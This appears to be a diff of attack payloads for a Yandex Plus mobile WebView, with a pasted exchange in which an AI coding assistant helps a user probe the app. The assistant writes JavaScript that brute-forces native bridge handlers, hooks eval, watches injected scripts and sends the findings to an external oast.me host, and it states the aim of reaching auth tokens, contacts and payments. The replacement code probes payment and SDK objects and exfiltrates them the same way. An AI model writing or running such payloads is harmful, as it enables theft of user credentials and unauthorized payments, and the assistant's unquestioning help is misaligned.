@@ -1,160 +1,36 @@
-<script>
-  var handlers = [
-    "plus", "plusSDK", "YandexPlus", "YaPlusSDK", "sdk",
-    "native", "nativeCall", "bridge", "app", "appBridge",
-    "smartWebview", "SmartWebview", "webview", "WebView",
-    "cookie", "cookieInject", "CookieInject",
-    "broadcast", "Broadcasting", "message", "messaging",
-    "contacts", "ContactsSelect", "contactsSelect",
-    "navigation", "navigate", "close", "back",
-    "payment", "pay", "fintech", "bank",
-    "auth", "token", "session", "getToken",
-    "device", "deviceInfo", "analytics", "log",
-    "storage", "keychain", "biometric",
-    "vibrate", "haptic",
-    "camera", "photo", "gallery",
-    "share", "clipboard",
-    "openURL", "openUrl", "deeplink"
-  ];
-
-  var found = [];
-  handlers.forEach(function(h){
-    try {
-      if(window.webkit.messageHandlers[h]){
-        found.push(h);
-        // Try to call it
-        window.webkit.messageHandlers[h].postMessage({action:"ping"});
-      }
-    } catch(e){
-      // If it throws TypeError "undefined" = doesn't exist
-      // If it throws anything ELSE = it EXISTS but rejected our message
-      if(e.name !== "TypeError") found.push(h + " (exists, error: " + e.message + ")");
-    }
-  });
-
-  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bridges?" + encodeURIComponent(JSON.stringify(found)));
-  document.title = "Found: " + JSON.stringify(found);
-  </script>
-
-  This brute-forces handler names. If any exist, we can then try calling them with postMessage() to invoke native functions (potentially: get auth tokens, access contacts, make payments, etc.).
-
-✻ Cogitated for 16s
-
-❯ bridges is empty, could it be that it expects the page to load the sdk to register the bridges or IDK! How to proceed and/or debug?                                                                          
-
-⏺ You're probably right — the bridges get registered after the SDK JavaScript loads in the page. The WebView expects your page to load the Yandex Plus SDK JS, which then sets up the messageHandlers via
-  native-to-JS communication.
-
-  How to debug/proceed
-
-  1. Find the SDK JS URL
-
-  The app likely injects or expects a script tag like:
-  <script src="https://yastatic.net/plus-sdk/v1/sdk.js"></script>
-
-  Try these common Yandex CDN patterns:
-
-  <html>
-  <head><title>Loading...</title></head>
+<html>
+  <head><title>Probing...</title></head>
   <body>
   <script>
-  // Try to find the SDK by loading common URLs
-  var sdkUrls = [
-    "https://yastatic.net/plus-sdk/latest/sdk.js",
-    "https://yastatic.net/plus-sdk/v1/sdk.js",
-    "https://yastatic.net/plus-home-sdk/sdk.js",
-    "https://yastatic.net/s3/plus/sdk/sdk.js",
-    "https://plus-sdk.yandex.net/sdk.js",
-    "https://yastatic.net/s3/fintech/sdk.js"
-  ];
+  var data = {};
 
-  var results = [];
-
-  function tryLoad(url, idx) {
-    var s = document.createElement("script");
-    s.src = url;
-    s.onload = function(){ results.push("LOADED: " + url); report(); };
-    s.onerror = function(){ results.push("FAIL: " + url); if(idx >= sdkUrls.length-1) report(); };
-    document.head.appendChild(s);
+  // Probe __plusSDKMobileCompat
+  try {
+    var sdk = window.__plusSDKMobileCompat;
+    data.plusSDK_type = typeof sdk;
+    data.plusSDK_keys = Object.keys(sdk);
+    data.plusSDK_proto = Object.getOwnPropertyNames(Object.getPrototypeOf(sdk));
+    data.plusSDK_str = JSON.stringify(sdk);
+    // Try to enumerate all properties including non-enumerable
+    data.plusSDK_allProps = Object.getOwnPropertyNames(sdk);
+  } catch(e) {
+    data.plusSDK_error = e.message;
   }
 
-  function report() {
-    // After all attempted, check what's now available
-    var globals = [];
-    var checkNames = ["YaPlusSDK","YandexPlus","PlusSDK","plusSdk","Plus","sdk","ya","Ya"];
-    checkNames.forEach(function(n){ if(window[n]) globals.push(n + "=" + typeof window[n]); });
-
-    // Re-check bridges
-    var bridges = [];
-    try {
-      var mh = window.webkit.messageHandlers;
-      // Try known names again after SDK load
-      ["plus","plusSDK","native","bridge","sdk","SmartWebview","smartWebview"].forEach(function(h){
-        try { if(mh[h]) bridges.push(h); }
-        catch(e){ if(e.name!=="TypeError") bridges.push(h+"(err:"+e.message+")"); }
-      });
-    } catch(e){}
-
-    var data = {results: results, globals: globals, bridges: bridges};
-    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/sdk?" + encodeURIComponent(JSON.stringify(data)));
-    document.title = JSON.stringify(data);
+  // Probe __webviewPaymentWidget
+  try {
+    var pay = window.__webviewPaymentWidget;
+    data.payment_type = typeof pay;
+    data.payment_keys = Object.keys(pay);
+    data.payment_proto = Object.getOwnPropertyNames(Object.getPrototypeOf(pay));
+    data.payment_str = JSON.stringify(pay);
+    data.payment_allProps = Object.getOwnPropertyNames(pay);
+  } catch(e) {
+    data.payment_error = e.message;
   }
 
-  sdkUrls.forEach(function(url, i){ tryLoad(url, i); });
-
-  // Also report after 5s timeout in case nothing loads
-  setTimeout(report, 5000);
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/sdk-probe?" + encodeURIComponent(JSON.stringify(data)));
+  document.title = JSON.stringify(data);
   </script>
-  </body>
-  </html>
-
-  2. Intercept what the app injects
-
-  The SDK might be injected by the native app via evaluateJavaScript() after page load. To catch this:
-
-  <script>
-  // Monitor for new scripts being added
-  var observer = new MutationObserver(function(mutations) {
-    mutations.forEach(function(m) {
-      m.addedNodes.forEach(function(n) {
-        if(n.tagName === "SCRIPT") {
-          fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/injected?src=" +
-            encodeURIComponent(n.src || n.textContent.substring(0,500)));
-        }
-      });
-    });
-  });
-  observer.observe(document.documentElement, {childList:true, subtree:true});
-
-  // Also hook eval/Function to catch injected code
-  var origEval = window.eval;
-  window.eval = function(code) {
-    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/eval?" +
-      encodeURIComponent(code.substring(0,1000)));
-    return origEval(code);
-  };
-
-  // Report after 10s what globals exist
-  setTimeout(function(){
-    var all = Object.keys(window).filter(function(k){
-      return !["location","chrome","ozone","cdc_adoQpoasnfa76pfcZLmcfl"].includes(k);
-    });
-    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/globals?" +
-      encodeURIComponent(JSON.stringify(all)));
-  }, 10000);
-  </script>
-
-  3. Check if page needs specific meta/headers
-
-  The SDK might only init if it sees a specific meta tag or response header:
-
-  <html>
-  <head>
-    <meta name="ya-plus-sdk" content="enabled">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>YandexPlus</title>
-  </head>
-  <body>
-  <!-- combine both approaches above -->
   </body>
   </html>
